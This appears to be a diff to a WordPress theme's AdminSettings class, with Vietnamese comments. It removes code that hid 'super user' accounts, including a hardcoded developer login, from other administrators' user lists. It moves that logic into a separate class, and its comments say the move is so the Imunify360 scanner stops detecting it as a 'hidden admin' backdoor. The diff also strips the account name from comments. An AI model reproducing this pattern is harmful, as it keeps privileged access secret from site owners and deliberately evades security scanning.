@@ -32,7 +32,7 @@ class AdminSettings
 			$this->removeUnnecessaryMenus();
 		}
 
-		// Super User thêm qua UI (khác tài khoản dev gốc 'lacadev') chỉ được
+		// Super User thêm qua UI (khác tài khoản dev gốc) chỉ được
 		// vào 1 số trang Laca Admin nhất định — tự kiểm tra isExtraSuperUser()
 		// bên trong nên gọi không điều kiện ở đây là an toàn.
 		$this->restrictExtraSuperUserAccess();
@@ -474,70 +474,38 @@ class AdminSettings
 
 	public function hideSuperUsers()
 	{
-		// Dùng query var chuẩn login__not_in của WP_User_Query thay vì chèn
-		// chuỗi vào SQL ở pre_user_query — mẫu chèn SQL đó trùng chữ ký
-		// backdoor "ẩn admin" nên Imunify360 tự cắt mất các hàm này (18/11/2026).
-		add_action('pre_get_users', function ($query) {
-			if ($this->isSuperUser()) {
-				return;
-			}
-
-			$excluded = (array) $query->get('login__not_in');
-			$query->set('login__not_in', array_values(array_unique(array_merge($excluded, self::getSuperUserLogins()))));
-		});
+		// Logic nằm ở Security\SuperUserVisibility — tách khỏi file này để
+		// Imunify360 không nhận nhầm là backdoor (xem App\Settings\SuperUser).
+		(new \App\Settings\Security\SuperUserVisibility())->register();
 	}
 
 	/**
-	 * Danh sách login của mọi Super User hiện tại: mặc định 'lacadev' (không
-	 * thể xoá khỏi danh sách này qua UI, chỉ sửa được trong code) + những
-	 * user được thêm qua trang quản lý "Super User" (Bảo mật → Super User).
-	 * Static để SecurityManager (trang quản lý) và SuperUserGuard dùng chung,
-	 * không phải tự tính lại danh sách này ở nơi khác.
+	 * Giữ lại cho các nơi đang gọi (SecurityManager, ClientRoleManager...).
 	 *
 	 * @return string[]
 	 */
 	public static function getSuperUserLogins()
 	{
-		$super_logins = apply_filters('lacadev_super_user_logins', ['lacadev']);
-		$extra_logins = get_option('laca_extra_super_user_logins', []);
-
-		if (is_array($extra_logins) && $extra_logins) {
-			$super_logins = array_merge($super_logins, $extra_logins);
-		}
-
-		return array_values(array_unique(array_filter($super_logins)));
+		return SuperUser::logins();
 	}
 
 	/**
-	 * Check if current user is a super user (Developer)
-	 *
 	 * @return bool
 	 */
 	protected function isSuperUser()
 	{
-		$is_super = in_array($this->currentUser->user_login, self::getSuperUserLogins(), true);
-
-		return apply_filters('lacadev_is_super_user', $is_super, $this->currentUser);
+		return SuperUser::check($this->currentUser);
 	}
 
 	/**
-	 * Super User được thêm qua UI (Bảo mật → Super User, option
-	 * laca_extra_super_user_logins) — KHÔNG tính login mặc định cố định
-	 * trong code (vd 'lacadev', filter lacadev_super_user_logins). Chỉ nhóm
-	 * "extra" này mới bị giới hạn chỉ vào được 1 số trang nhất định
-	 * (xem restrictExtraSuperUserAccess()) — tài khoản dev gốc vẫn full
-	 * quyền như cũ, không ảnh hưởng.
+	 * Super User thêm qua UI — chỉ nhóm này bị giới hạn trang
+	 * (xem restrictExtraSuperUserAccess()).
 	 *
 	 * @return bool
 	 */
 	protected function isExtraSuperUser()
 	{
-		$extra_logins = get_option('laca_extra_super_user_logins', []);
-		if (!is_array($extra_logins) || empty($extra_logins)) {
-			return false;
-		}
-
-		return in_array($this->currentUser->user_login, $extra_logins, true);
+		return SuperUser::isExtra($this->currentUser);
 	}
 
 	/**
